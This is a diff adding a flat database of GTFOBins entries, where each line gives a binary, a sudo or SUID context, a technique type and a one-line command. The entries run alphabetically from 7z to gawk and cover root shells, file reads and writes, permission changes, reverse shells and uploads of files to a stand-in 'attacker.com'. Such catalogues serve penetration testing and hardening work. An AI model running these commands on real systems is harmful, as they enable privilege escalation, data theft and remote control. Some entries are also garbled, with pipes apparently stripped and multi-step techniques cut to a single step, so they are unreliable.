@@ -1,0 +1,1440 @@
+# gtfobins_flat.db - Auto-generated from GTFOBins (https://gtfobins.org/)
+# Format: binary|context|type|command
+7z|sudo|file-read|sudo 7z a -ttar -an -so /path/to/input-file   7z e -ttar -si -so
+R|sudo|shell|sudo R --no-save -e 'system("/bin/sh")'
+R|suid|shell|./R --no-save -e 'system("/bin/sh")'
+aa-exec|sudo|shell|sudo aa-exec /bin/sh
+aa-exec|suid|shell|./aa-exec /bin/sh
+ab|sudo|upload|sudo ab -p /path/to/input-file http://attacker.com/
+ab|sudo|download|sudo ab -v2 http://attacker.com/path/to/input-file
+ab|suid|upload|./ab -p /path/to/input-file http://attacker.com/
+ab|suid|download|./ab -v2 http://attacker.com/path/to/input-file
+acr|sudo|command|sudo echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >/path/to/temp-file
+acr|suid|command|./echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >/path/to/temp-file
+agetty|suid|shell|./agetty -l /bin/sh -o -p -a root tty
+alpine|sudo|file-read|sudo alpine -F /path/to/input-file
+alpine|suid|file-read|./alpine -F /path/to/input-file
+ansible-playbook|sudo|shell|sudo echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >/path/to/temp-file
+ansible-test|sudo|shell|sudo ansible-test shell
+aoss|sudo|shell|sudo aoss /bin/sh
+apache2|sudo|file-read|sudo apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /path/to/input-file'
+apache2|sudo|file-read|sudo apache2 -f /path/to/input-file
+apache2|suid|file-read|./apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /path/to/input-file'
+apache2|suid|file-read|./apache2 -f /path/to/input-file
+apache2ctl|sudo|file-read|sudo apache2ctl -c 'Include /path/to/input-file'
+apt|sudo|shell|sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+apt|sudo|shell|sudo echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' >/path/to/temp-file
+apt|sudo|inherit|sudo apt-get changelog apt
+apt|suid|shell|./apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+apt|suid|shell|./echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' >/path/to/temp-file
+apt-get|sudo|shell|sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+apt-get|sudo|shell|sudo echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' >/path/to/temp-file
+apt-get|sudo|inherit|sudo apt-get changelog apt
+apt-get|suid|shell|./apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+apt-get|suid|shell|./echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' >/path/to/temp-file
+aptitude|sudo|inherit|sudo aptitude changelog aptitude
+ar|sudo|file-read|sudo ar r /path/to/output-file /path/to/input-file
+ar|suid|file-read|./ar r /path/to/output-file /path/to/input-file
+arch-nspawn|sudo|shell|sudo mkdir -p ./etc/
+aria2c|sudo|command|sudo aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa
+aria2c|sudo|command|sudo echo /path/to/command >/path/to/temp-file
+aria2c|sudo|file-read|sudo aria2c -i /path/to/input-file
+aria2c|sudo|download|sudo aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file
+aria2c|suid|command|./aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa
+aria2c|suid|command|./echo /path/to/command >/path/to/temp-file
+aria2c|suid|file-read|./aria2c -i /path/to/input-file
+aria2c|suid|download|./aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file
+arj|sudo|file-write|sudo echo DATA >output-file
+arj|sudo|file-read|sudo arj a /path/to/output-file /path/to/input-file
+arj|suid|file-write|./echo DATA >output-file
+arj|suid|file-read|./arj a /path/to/output-file /path/to/input-file
+arp|sudo|file-read|sudo arp -v -f /path/to/input-file
+arp|suid|file-read|./arp -v -f /path/to/input-file
+as|sudo|file-read|sudo as @/path/to/input-file
+as|suid|file-read|./as @/path/to/input-file
+ascii-xfr|sudo|file-read|sudo ascii-xfr -ns /path/to/input-file
+ascii-xfr|suid|file-read|./ascii-xfr -ns /path/to/input-file
+ascii85|sudo|file-read|sudo ascii85 /path/to/input-file   ascii85 --decode
+ash|sudo|shell|sudo ash
+ash|sudo|file-write|sudo ash -c 'echo DATA >/path/to/output-file'
+ash|suid|shell|ash -p
+ash|suid|file-write|ash -p -c 'echo DATA >/path/to/output-file'
+aspell|sudo|file-read|sudo aspell --conf /path/to/input-file
+aspell|sudo|file-read|sudo aspell -c /path/to/input-file
+aspell|suid|file-read|./aspell --conf /path/to/input-file
+aspell|suid|file-read|./aspell -c /path/to/input-file
+asterisk|sudo|shell|sudo asterisk -r
+asterisk|suid|shell|./asterisk -r
+at|sudo|shell|sudo echo "/bin/sh <$(tty) >$(tty) 2>$(tty)"   at now; tail -f /dev/null
+at|sudo|command|sudo echo /path/to/command   at now
+atobm|sudo|file-read|sudo atobm /path/to/input-file
+atobm|suid|file-read|./atobm /path/to/input-file
+autoconf|sudo|shell|sudo echo /bin/sh >/path/to/temp-file
+autoheader|sudo|shell|sudo echo '/bin/sh 1>&0' >/path/to/temp-file
+autoreconf|sudo|shell|sudo echo '/bin/sh 1>&0' >/path/to/temp-file
+awk|sudo|shell|sudo mawk 'BEGIN {system("/bin/sh")}'
+awk|sudo|file-write|sudo mawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
+awk|sudo|file-read|sudo mawk '//' /path/to/input-file
+awk|suid|shell|./mawk 'BEGIN {system("/bin/sh")}'
+awk|suid|file-write|./mawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
+awk|suid|file-read|./mawk '//' /path/to/input-file
+aws|sudo|file-read|sudo aws ec2 describe-instances --filter file:///path/to/input-file
+aws|sudo|inherit|sudo aws help
+aws|suid|file-read|./aws ec2 describe-instances --filter file:///path/to/input-file
+base32|sudo|file-read|sudo base32 /path/to/input-file   base32 --decode
+base32|suid|file-read|./base32 /path/to/input-file   base32 --decode
+base58|sudo|file-read|sudo base58 /path/to/input-file   base58 --decode
+base64|sudo|file-read|sudo base64 /path/to/input-file   base64 --decode
+base64|suid|file-read|./base64 /path/to/input-file   base64 --decode
+basenc|sudo|file-read|sudo basenc --base64 /path/to/input-file   basenc -d --base64
+basenc|suid|file-read|./basenc --base64 /path/to/input-file   basenc -d --base64
+basez|sudo|file-read|sudo basez /path/to/input-file   basez --decode
+basez|suid|file-read|./basez /path/to/input-file   basez --decode
+bash|sudo|shell|sudo bash
+bash|sudo|reverse-shell|sudo bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1'
+bash|sudo|file-write|sudo HISTIGNORE='history *'
+bash|sudo|file-write|sudo bash -c 'echo DATA >/path/to/output-file'
+bash|sudo|file-read|sudo HISTTIMEFORMAT=$'\r\e[K'
+bash|sudo|file-read|sudo bash -c 'echo "$(</path/to/input-file)"'
+bash|sudo|upload|sudo bash -c 'echo -e "POST / HTTP/0.9\n\n$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
+bash|sudo|upload|sudo bash -c 'echo -n "$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
+bash|suid|shell|bash -p
+bash|suid|reverse-shell|bash -p -c 'exec bash -p -i &>/dev/tcp/attacker.com/12345 <&1'
+bash|suid|file-write|./HISTIGNORE='history *'
+bash|suid|file-write|bash -p -c 'echo DATA >/path/to/output-file'
+bash|suid|file-read|./HISTTIMEFORMAT=$'\r\e[K'
+bash|suid|file-read|bash -p -c 'echo "$(</path/to/input-file)"'
+bash|suid|upload|bash -p -c 'echo -e "POST / HTTP/0.9\n\n$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
+bash|suid|upload|bash -p -c 'echo -n "$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
+bashbug|sudo|inherit|sudo bashbug
+batcat|sudo|inherit|sudo batcat --paging always /etc/hosts
+batcat|suid|inherit|./batcat --paging always /etc/hosts
+bbot|sudo|file-read|sudo bbot -d -cy /path/to/input-file
+bc|sudo|file-read|sudo bc -s /path/to/input-file
+bc|suid|file-read|./bc -s /path/to/input-file
+bconsole|sudo|shell|sudo bconsole
+bconsole|sudo|file-read|sudo bconsole -c /path/to/file-input
+bconsole|suid|file-read|./bconsole -c /path/to/file-input
+bee|sudo|inherit|sudo bee eval '...'
+bee|suid|inherit|./bee eval '...'
+borg|sudo|shell|sudo borg extract @:/::: --rsh "/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'"
+bpftrace|sudo|shell|sudo bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
+bpftrace|sudo|shell|sudo bpftrace -c /bin/sh -e 'END {exit()}'
+bpftrace|sudo|shell|sudo echo 'BEGIN {system("/bin/sh 1<&0");exit()}' >/path/to/temp-file
+bridge|sudo|file-read|sudo bridge -b /path/to/input-file
+bridge|suid|file-read|./bridge -b /path/to/input-file
+bundle|sudo|shell|sudo BUNDLE_GEMFILE=x bundle exec /bin/sh
+bundle|sudo|shell|sudo echo 'system("/bin/sh")' >Gemfile
+bundle|sudo|inherit|sudo bundle help
+bundle|sudo|inherit|sudo touch Gemfile
+bundler|sudo|shell|sudo BUNDLE_GEMFILE=x bundle exec /bin/sh
+bundler|sudo|shell|sudo echo 'system("/bin/sh")' >Gemfile
+bundler|sudo|inherit|sudo bundle help
+bundler|sudo|inherit|sudo touch Gemfile
+busctl|sudo|shell|sudo busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
+busctl|sudo|shell|sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
+busctl|sudo|inherit|sudo busctl --show-machine
+busctl|suid|shell|busctl --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
+busctl|suid|shell|busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
+busctl|suid|inherit|./busctl --show-machine
+busybox|sudo|reverse-shell|sudo busybox nc -e /bin/sh attacker.com 12345
+busybox|sudo|upload|sudo busybox httpd -f -p 12345 -h .
+busybox|sudo|inherit|sudo busybox ash
+busybox|sudo|inherit|sudo busybox cat
+byebug|sudo|inherit|sudo byebug --no-stop /path/to/script.rb
+bzip2|sudo|file-read|sudo bzip2 -c /path/to/input-file   bzip2 -d
+bzip2|suid|file-read|./bzip2 -c /path/to/input-file   bzip2 -d
+c89|sudo|shell|sudo gcc -wrapper /bin/sh,-s x
+c89|sudo|file-write|sudo gcc -x c /dev/null -o /path/to/input-file
+c89|sudo|file-read|sudo gcc -x c -E /path/to/input-file
+c89|sudo|file-read|sudo gcc @/path/to/input-file
+c99|sudo|shell|sudo gcc -wrapper /bin/sh,-s x
+c99|sudo|file-write|sudo gcc -x c /dev/null -o /path/to/input-file
+c99|sudo|file-read|sudo gcc -x c -E /path/to/input-file
+c99|sudo|file-read|sudo gcc @/path/to/input-file
+cabal|sudo|shell|sudo cabal exec --project-file=/dev/null -- /bin/sh
+cabal|suid|shell|cabal exec --project-file=/dev/null -- /bin/sh -p
+cancel|sudo|upload|sudo cancel -h attacker.com:12345 -u DATA
+cancel|suid|upload|./cancel -h attacker.com:12345 -u DATA
+capsh|sudo|shell|sudo capsh --
+capsh|suid|shell|capsh --gid=0 --uid=0 --
+cargo|sudo|inherit|sudo cargo help doc
+cat|sudo|file-read|sudo cat /path/to/input-file
+cat|suid|file-read|./cat /path/to/input-file
+cc|sudo|shell|sudo gcc -wrapper /bin/sh,-s x
+cc|sudo|file-write|sudo gcc -x c /dev/null -o /path/to/input-file
+cc|sudo|file-read|sudo gcc -x c -E /path/to/input-file
+cc|sudo|file-read|sudo gcc @/path/to/input-file
+cdist|sudo|shell|sudo cdist shell -s /bin/sh
+certbot|sudo|shell|sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'
+chattr|sudo|privilege-escalation|sudo chattr +i /path/to/input-file
+chattr|suid|privilege-escalation|./chattr +i /path/to/input-file
+check_by_ssh|sudo|shell|sudo check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty)  & tee $(tty)" -H localhost -C x
+check_cups|sudo|file-read|sudo check_cups --extra-opts=@/path/to/input-file
+check_log|sudo|file-write|sudo check_log -F /path/to/input-file -O /path/to/output-file
+check_log|sudo|file-read|sudo check_log -F /path/to/input-file -O /dev/stdout
+check_memory|sudo|file-read|sudo check_memory --extra-opts=@/path/to/input-file
+check_raid|sudo|file-read|sudo check_raid --extra-opts=@/path/to/input-file
+check_ssl_cert|sudo|shell|sudo echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
+check_statusfile|sudo|file-read|sudo check_statusfile /path/to/input-file
+chmod|sudo|privilege-escalation|sudo chmod 6777 /path/to/input-file
+chmod|suid|privilege-escalation|./chmod 6777 /path/to/input-file
+choom|sudo|shell|sudo choom -n 0 /bin/sh
+choom|suid|shell|choom -n 0 -- /bin/sh -p
+chown|sudo|privilege-escalation|sudo chown $(id -un):$(id -gn) /path/to/input-file
+chown|suid|privilege-escalation|./chown $(id -un):$(id -gn) /path/to/input-file
+chroot|sudo|shell|sudo chroot /
+chroot|suid|shell|chroot / /bin/sh -p
+chrt|sudo|shell|sudo chrt 1 /bin/sh
+chrt|suid|shell|chrt 1 /bin/sh -p
+clamscan|sudo|file-read|sudo touch x.yara
+clamscan|suid|file-read|./touch x.yara
+clisp|sudo|shell|sudo clisp -x '(ext:run-shell-command "/bin/sh")(ext:exit)'
+clisp|suid|shell|./clisp -x '(ext:run-shell-command "/bin/sh")(ext:exit)'
+cmake|sudo|shell|sudo echo 'execute_process(COMMAND /bin/sh)' >/path/to/CMakeLists.txt
+cmake|sudo|file-read|sudo cmake -E cat /path/to/input-file
+cmp|sudo|file-read|sudo cmp /path/to/input-file /dev/zero -b -l
+cmp|suid|file-read|./cmp /path/to/input-file /dev/zero -b -l
+cobc|sudo|shell|sudo echo 'CALL "SYSTEM" USING "/bin/sh".' >/path/to/temp-file
+cobc|suid|shell|./echo 'CALL "SYSTEM" USING "/bin/sh".' >/path/to/temp-file
+code|sudo|download|sudo code tunnel --name xxxxxx
+codex|sudo|shell|sudo codex sandbox linux /bin/sh
+column|sudo|file-read|sudo column /path/to/input-file
+column|suid|file-read|./column /path/to/input-file
+comm|sudo|file-read|sudo comm /path/to/input-file /dev/null
+comm|suid|file-read|./comm /path/to/input-file /dev/null
+composer|sudo|shell|sudo echo '{"scripts":{"x":"/bin/sh"}}' >composer.json
+cowsay|sudo|inherit|sudo cowsay -f /path/to/script.pl x
+cowthink|sudo|inherit|sudo cowthink -f /path/to/script.pl x
+cp|sudo|privilege-escalation|sudo cp --attributes-only --preserve=all /path/to/input-file /path/to/output-file
+cp|sudo|privilege-escalation|sudo cp /path/to/input-file /path/to/output-file
+cp|sudo|file-write|sudo echo DATA   cp /dev/stdin /path/to/output-file
+cp|sudo|file-read|sudo cp /path/to/input-file /dev/stdout
+cp|suid|privilege-escalation|./cp --attributes-only --preserve=all /path/to/input-file /path/to/output-file
+cp|suid|privilege-escalation|./cp /path/to/input-file /path/to/output-file
+cp|suid|file-write|./echo DATA   cp /dev/stdin /path/to/output-file
+cp|suid|file-read|./cp /path/to/input-file /dev/stdout
+cpan|sudo|inherit|sudo cpan
+cpio|sudo|shell|sudo echo '/bin/sh </dev/tty >/dev/tty' >localhost
+cpio|sudo|file-write|echo DATA >/path/to/temp-file echo /path/to/temp-file   cpio -R 0:0 -udp .
+cpio|sudo|file-read|echo /path/to/input-file   cpio -R $UID -dp . cat path/to/input-file
+cpio|sudo|file-read|sudo echo /path/to/input-file   cpio -o
+cpio|suid|file-write|echo DATA >/path/to/temp-file echo /path/to/temp-file   cpio -R 0:0 -udp .
+cpio|suid|file-read|./echo /path/to/input-file   cpio -o
+cpio|suid|file-read|echo /path/to/input-file   cpio -R $UID -dp . cat path/to/input-file
+cpulimit|sudo|shell|sudo cpulimit -l 100 -f /bin/sh
+cpulimit|suid|shell|cpulimit -l 100 -f /bin/sh -p
+crash|sudo|command|sudo CRASHPAGER=/path/to/command crash -h
+crash|sudo|inherit|sudo crash -h
+crash|suid|inherit|./crash -h
+crontab|sudo|command|sudo crontab -e
+csh|sudo|shell|sudo csh
+csh|sudo|file-write|sudo csh -c 'echo DATA >/path/to/output-file'
+csh|suid|shell|csh -b
+csh|suid|file-write|csh -c 'echo DATA >/path/to/output-file' -b
+csplit|sudo|file-write|sudo echo DATA >/path/to/temp-file
+csplit|sudo|file-read|sudo csplit /path/to/input-file 1
+csplit|suid|file-write|./echo DATA >/path/to/temp-file
+csplit|suid|file-read|./csplit /path/to/input-file 1
+csvtool|sudo|shell|sudo csvtool call '/bin/sh;false' /etc/hosts
+csvtool|sudo|file-write|sudo echo DATA >/path/to/temp-file
+csvtool|sudo|file-read|sudo csvtool trim t /path/to/input-file
+csvtool|suid|shell|./csvtool call '/bin/sh;false' /etc/hosts
+csvtool|suid|file-write|./echo DATA >/path/to/temp-file
+csvtool|suid|file-read|./csvtool trim t /path/to/input-file
+ctr|sudo|shell|sudo ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x
+ctr|suid|shell|./ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x
+cupsfilter|sudo|file-read|sudo cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file
+cupsfilter|suid|file-read|./cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file
+curl|sudo|file-write|sudo echo DATA >/path/to/temp-file
+curl|sudo|file-read|sudo curl file:///path/to/input-file
+curl|sudo|upload|sudo curl -X POST --data-binary @/path/to/input-file http://attacker.com
+curl|sudo|upload|sudo curl -X POST --data-binary DATA http://attacker.com
+curl|sudo|upload|sudo curl gopher://attacker.com:12345/_DATA
+curl|sudo|download|sudo curl http://attacker.com/path/to/input-file -o /path/to/output-file
+curl|sudo|library-load|sudo curl --engine /path/to/lib.so x
+curl|suid|file-write|./echo DATA >/path/to/temp-file
+curl|suid|file-read|./curl file:///path/to/input-file
+curl|suid|upload|./curl -X POST --data-binary @/path/to/input-file http://attacker.com
+curl|suid|upload|./curl -X POST --data-binary DATA http://attacker.com
+curl|suid|upload|./curl gopher://attacker.com:12345/_DATA
+curl|suid|download|./curl http://attacker.com/path/to/input-file -o /path/to/output-file
+curl|suid|library-load|./curl --engine /path/to/lib.so x
+cut|sudo|file-read|sudo cut -d '' -f1 /path/to/input-file
+cut|suid|file-read|./cut -d '' -f1 /path/to/input-file
+dash|sudo|shell|sudo dash
+dash|sudo|file-write|sudo dash -c 'echo DATA >/path/to/output-file'
+dash|suid|shell|./dash
+dash|suid|file-write|./dash -c 'echo DATA >/path/to/output-file'
+date|sudo|file-read|sudo date -f /path/to/input-file
+date|suid|file-read|./date -f /path/to/input-file
+dc|sudo|shell|sudo dc -e '!/bin/sh'
+dc|suid|shell|./dc -e '!/bin/sh'
+dd|sudo|file-write|sudo echo DATA   dd of=/path/to/output-file
+dd|sudo|file-read|sudo dd if=/path/to/input-file
+dd|suid|file-write|./echo DATA   dd of=/path/to/output-file
+dd|suid|file-read|./dd if=/path/to/input-file
+debugfs|sudo|shell|sudo debugfs
+debugfs|suid|shell|./debugfs
+dhclient|sudo|shell|sudo dhclient -sf /bin/sh
+dialog|sudo|file-read|sudo dialog --textbox /path/to/input-file 0 0
+dialog|suid|file-read|./dialog --textbox /path/to/input-file 0 0
+diff|sudo|file-read|sudo diff --line-format=%L /dev/null /path/to/input-file
+diff|sudo|file-read|sudo diff --recursive /path/to/empty-dir /path/to/input-dir/
+diff|suid|file-read|./diff --line-format=%L /dev/null /path/to/input-file
+diff|suid|file-read|./diff --recursive /path/to/empty-dir /path/to/input-dir/
+dig|sudo|file-read|sudo dig -f /path/to/input-file
+dig|suid|file-read|./dig -f /path/to/input-file
+distcc|sudo|shell|sudo distcc /bin/sh
+distcc|suid|shell|distcc /bin/sh -p
+dmesg|sudo|file-read|sudo dmesg -rF /path/to/input-file
+dmesg|sudo|inherit|sudo dmesg -H
+dmesg|suid|file-read|./dmesg -rF /path/to/input-file
+dmesg|suid|inherit|./dmesg -H
+dmsetup|sudo|shell|sudo dmsetup create base <<EOF
+dmsetup|suid|shell|dmsetup create base <<EOF 0 3534848 linear /dev/loop0 94208 EOF dmsetup ls --exec '/bin/sh -p -s'
+dnf|sudo|command|sudo dnf install -y x-1.0-1.noarch.rpm --disablerepo=*
+dnsmasq|sudo|command|sudo dnsmasq --conf-script='/path/to/command 1>&2'
+dnsmasq|suid|command|./dnsmasq --conf-script='/path/to/command 1>&2'
+doas|sudo|shell|sudo doas -u root /bin/sh
+docker|sudo|shell|sudo docker run --rm -it --privileged -u root alpine
+docker|sudo|shell|sudo docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
+docker|sudo|file-write|sudo echo DATA >/path/to/temp-file
+docker|sudo|file-read|sudo docker cp /path/to/input-file $CONTAINER_ID:input-file
+docker|suid|shell|./docker run --rm -it --privileged -u root alpine
+docker|suid|shell|./docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
+docker|suid|file-write|./echo DATA >/path/to/temp-file
+docker|suid|file-read|./docker cp /path/to/input-file $CONTAINER_ID:input-file
+dos2unix|sudo|file-write|sudo dos2unix -f -n /path/to/input-file /path/to/output-file
+dos2unix|sudo|file-read|sudo dos2unix -f -O /path/to/input-file
+dos2unix|suid|file-write|./dos2unix -f -n /path/to/input-file /path/to/output-file
+dos2unix|suid|file-read|./dos2unix -f -O /path/to/input-file
+dosbox|sudo|file-write|sudo dosbox -c 'mount c /' -c "echo DATA >c:\path\to\output" -c exit
+dosbox|sudo|file-read|sudo dosbox -c 'mount c /' -c 'copy c:\path\to\input c:\path\to\output' -c exit
+dosbox|sudo|file-read|sudo dosbox -c 'mount c /' -c 'type c:\path\to\input'
+dosbox|suid|file-write|./dosbox -c 'mount c /' -c "echo DATA >c:\path\to\output" -c exit
+dosbox|suid|file-read|./dosbox -c 'mount c /' -c 'copy c:\path\to\input c:\path\to\output' -c exit
+dosbox|suid|file-read|./dosbox -c 'mount c /' -c 'type c:\path\to\input'
+dotnet|sudo|file-read|sudo dotnet fsi
+dpkg|sudo|shell|sudo dpkg -i x_1.0_all.deb
+dpkg|sudo|inherit|sudo dpkg -l
+dpkg|suid|inherit|./dpkg -l
+dstat|sudo|inherit|sudo dstat --xxx
+dvips|sudo|shell|sudo dvips -R0 texput.dvi
+dvips|suid|shell|./dvips -R0 texput.dvi
+easy_install|sudo|inherit|sudo echo '...' >setup.py
+easyrsa|sudo|shell|sudo echo 'set_var X "$(/bin/sh 1>&0)"' >/path/to/temp-file
+easyrsa|suid|shell|./echo 'set_var X "$(/bin/sh 1>&0)"' >/path/to/temp-file
+eb|sudo|inherit|sudo eb logs
+ed|sudo|shell|sudo ed
+ed|sudo|file-write|sudo ed /path/to/output-file
+ed|sudo|file-read|sudo ed /path/to/input-file
+ed|suid|shell|./ed
+ed|suid|file-write|./ed /path/to/output-file
+ed|suid|file-read|./ed /path/to/input-file
+efax|sudo|file-read|sudo efax -d /path/to/input-file
+efax|suid|file-read|./efax -d /path/to/input-file
+egrep|sudo|file-read|sudo grep '' /path/to/input-file
+egrep|suid|file-read|./grep '' /path/to/input-file
+elvish|sudo|shell|sudo elvish
+elvish|sudo|file-write|sudo elvish -c 'print DATA >/path/to/output-file'
+elvish|sudo|file-read|sudo elvish -c 'print (slurp </path/to/input-file)'
+elvish|suid|shell|./elvish
+elvish|suid|file-write|./elvish -c 'print DATA >/path/to/output-file'
+elvish|suid|file-read|./elvish -c 'print (slurp </path/to/input-file)'
+emacs|sudo|shell|sudo emacs -Q -nw --eval '(term "/bin/sh")'
+emacs|sudo|file-write|sudo emacs /path/to/output-file
+emacs|sudo|file-read|sudo emacs /path/to/input-file
+enscript|sudo|shell|sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
+enscript|suid|shell|./enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
+env|sudo|shell|sudo env /bin/sh
+env|suid|shell|env /bin/sh -p
+eqn|sudo|file-read|sudo eqn /path/to/input-file
+eqn|suid|file-read|./eqn /path/to/input-file
+espeak|sudo|file-read|sudo espeak -qXf /path/to/input-file
+espeak|suid|file-read|./espeak -qXf /path/to/input-file
+ex|sudo|shell|sudo ex -c ':!/bin/sh'
+ex|sudo|inherit|sudo ex
+ex|suid|shell|./ex -c ':!/bin/sh'
+ex|suid|inherit|./ex
+exiftool|sudo|file-write|sudo exiftool "-description<=/path/to/input-file --filename /path/to/output-file
+exiftool|sudo|file-write|sudo exiftool "-description=DATA --filename /path/to/output-file
+exiftool|sudo|file-write|sudo exiftool -description -W /path/to/output-file --filename /path/to/input-file
+exiftool|sudo|file-read|sudo exiftool -filename=/path/to/output-file /path/to/input-file
+exiftool|sudo|inherit|sudo exiftool -if '...' /etc/passwd
+expand|sudo|file-read|sudo expand /path/to/input-file
+expand|suid|file-read|./expand /path/to/input-file
+expect|sudo|shell|sudo expect -c 'spawn /bin/sh;interact'
+expect|sudo|file-read|sudo expect /path/to/input-file
+expect|suid|shell|expect -c 'spawn /bin/sh -p;interact'
+expect|suid|file-read|./expect /path/to/input-file
+facter|sudo|inherit|sudo FACTERLIB=/path/to/dir/ facter
+facter|sudo|inherit|sudo facter --custom-dir=/path/to/dir/ x
+fail2ban-client|sudo|command|sudo cat >/path/to/temp-dir/fail2ban.conf <<EOF
+fail2ban-client|sudo|command|sudo fail2ban-client add x
+fastfetch|sudo|shell|sudo echo '{"modules":[{"type":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}' >/path/to/temp-file.jsonc
+fastfetch|sudo|command|sudo echo '{"modules":[{"type":"command","key":"x","text":"exec /path/to/command"}]}' >/path/to/temp-file.jsonc
+fastfetch|sudo|file-read|sudo fastfetch --file /path/to/input-file
+fastfetch|suid|shell|./echo '{"modules":[{"type":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}' >/path/to/temp-file.jsonc
+fastfetch|suid|command|./echo '{"modules":[{"type":"command","key":"x","text":"exec /path/to/command"}]}' >/path/to/temp-file.jsonc
+fastfetch|suid|file-read|./fastfetch --file /path/to/input-file
+ffmpeg|sudo|library-load|sudo ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav
+ffmpeg|suid|library-load|./ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav
+fgrep|sudo|file-read|sudo grep '' /path/to/input-file
+fgrep|suid|file-read|./grep '' /path/to/input-file
+file|sudo|file-read|sudo file -f /path/to/input-file
+file|sudo|file-read|sudo file -m /path/to/input-file
+file|suid|file-read|./file -f /path/to/input-file
+file|suid|file-read|./file -m /path/to/input-file
+find|sudo|shell|sudo find . -exec /bin/sh \; -quit
+find|sudo|file-write|sudo find / -fprintf /path/to/output-file DATA -quit
+find|sudo|file-read|sudo find /path/to/input-file -exec cat {} \;
+find|suid|shell|find . -exec /bin/sh -p \; -quit
+find|suid|file-write|./find / -fprintf /path/to/output-file DATA -quit
+find|suid|file-read|./find /path/to/input-file -exec cat {} \;
+finger|sudo|upload|sudo finger DATA@attacker.com
+finger|sudo|download|sudo finger x@attacker.com
+finger|suid|upload|./finger DATA@attacker.com
+finger|suid|download|./finger x@attacker.com
+firejail|sudo|shell|sudo firejail /bin/sh
+fish|sudo|shell|sudo fish
+fish|suid|shell|./fish
+flock|sudo|shell|sudo flock -u / /bin/sh
+flock|suid|shell|flock -u / /bin/sh -p
+fmt|sudo|file-read|sudo fmt -999 /path/to/input-file
+fmt|sudo|file-read|sudo fmt -pNON_EXISTING_PREFIX /path/to/input-file
+fmt|suid|file-read|./fmt -999 /path/to/input-file
+fmt|suid|file-read|./fmt -pNON_EXISTING_PREFIX /path/to/input-file
+fold|sudo|file-read|sudo fold -w999 /path/to/input-file
+fold|suid|file-read|./fold -w999 /path/to/input-file
+forge|sudo|shell|sudo echo '#!/bin/sh' >/path/to/temp-file
+forge|suid|shell|./echo '#!/bin/sh' >/path/to/temp-file
+fping|sudo|file-read|sudo fping -f /path/to/input-file
+fping|suid|file-read|./fping -f /path/to/input-file
+ftp|sudo|shell|sudo ftp
+ftp|sudo|download|sudo ftp -a attacker.com
+ftp|suid|shell|./ftp
+ftp|suid|download|./ftp -a attacker.com
+fzf|sudo|shell|sudo fzf --bind 'enter:execute(/bin/sh)'
+fzf|sudo|command|sudo fzf --listen=12345
+fzf|suid|shell|./fzf --bind 'enter:execute(/bin/sh)'
+fzf|suid|command|./fzf --listen=12345
+g++|sudo|shell|sudo gcc -wrapper /bin/sh,-s x
+g++|sudo|file-write|sudo gcc -x c /dev/null -o /path/to/input-file
+g++|sudo|file-read|sudo gcc -x c -E /path/to/input-file
+g++|sudo|file-read|sudo gcc @/path/to/input-file
+gawk|sudo|shell|sudo gawk 'BEGIN {system("/bin/sh")}'
+gawk|sudo|bind-shell|sudo gawk 'BEGIN {
+gawk|sudo|file-write|sudo gawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
+gawk|sudo|file-read|sudo gawk '//' /path/to/input-file
+gawk|suid|shell|./gawk 'BEGIN {system("/bin/sh")}'
